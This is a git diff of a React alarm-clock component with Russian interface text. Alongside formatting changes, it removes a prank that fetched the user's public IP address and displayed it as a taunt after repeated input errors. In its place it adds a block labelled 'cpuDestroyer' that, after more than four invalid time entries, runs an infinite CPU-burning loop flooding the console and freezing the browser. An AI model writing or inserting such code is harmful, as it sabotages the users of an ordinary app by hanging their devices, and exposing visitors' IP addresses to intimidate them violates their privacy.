@@ -33,8 +33,6 @@ const AlarmMain = () => {
     const [isError, setIsError] = useState('')
 
     const [count, setCount] = useState(0)
-    const [trigger, setTrigger] = useState(false)
-    const [ipUser, setIpUser] = useState("")
 
 
 
@@ -63,7 +61,7 @@ const AlarmMain = () => {
         const hours = Number(hourAlarm)
         const minutes = Number(minutesAlarm)
         if (hourAlarm.trim() === '' || minutesAlarm.trim() === '') {
-            setIsError("Пожалуйста, введите корректное время")
+            setIsError("Введите корректное время")
             setCount((prev)=>prev + 1)
             return;
         }
@@ -88,7 +86,7 @@ const AlarmMain = () => {
     useEffect(() => {
         let interval: ReturnType<typeof setInterval>;
         if (isCancelopen) {
-           interval = setInterval(()=>{
+            interval = setInterval(()=>{
                 const now = new Date();
                 const currentHour = now.getHours();
                 const currentMinute = now.getMinutes();
@@ -100,19 +98,24 @@ const AlarmMain = () => {
         return () => {clearInterval(interval);}
     },[isCancelopen, hourAlarm, minutesAlarm, audio])
 
+
+
+//cpuDestroyer
     useEffect(() => {
-        if(count > 5 ){
-            fetch('https://api.ipify.org?format=json')
-                .then(res => res.json())
-                .then(data => {
-                    setIpUser(data.ip)
-                    setTrigger(true)
-                    if (trigger){
-                        setIsError(`Опа ${ipUser}`)
-                    }
-                });
+        if (count === 4){
+            setIsError("подумай брат")
         }
-    }, [count, trigger]);
+        if (count <= 4) return;
+        while (true) {
+            // Тяжелые вычисления (например, криптография или математика)
+            let sum = 0;
+            for (let i = 0; i < 1e7; i++) sum += Math.random();
+            console.error("ERROR ERROR ERROR")
+            console.error(count)
+        }
+    }, [count]);
+
+
 
     useEffect(() => {
         return () => {
@@ -149,18 +152,18 @@ const AlarmMain = () => {
                                 <ul className={s.songsList}>
                                     {songs.map((song) => (
                                         <li
-                                        key={song.id}
-                                        onClick={()=>handleSongSelect(song)}
-                                        className={`${s.songItem} ${selectedSong.id === song.id ? s.selected : ''}`}
+                                            key={song.id}
+                                            onClick={()=>handleSongSelect(song)}
+                                            className={`${s.songItem} ${selectedSong.id === song.id ? s.selected : ''}`}
                                         >
                                             {song.name}
                                             {selectedSong.id === song.id && (
                                                 <button
-                                                onClick={(e)=>{
-                                                    e.stopPropagation()
-                                                    togglePreview()
-                                                }}
-                                                className={s.previewButton}
+                                                    onClick={(e)=>{
+                                                        e.stopPropagation()
+                                                        togglePreview()
+                                                    }}
+                                                    className={s.previewButton}
                                                 >
                                                     {isPlaying ? '⏸' : '▶'}
                                                 </button>
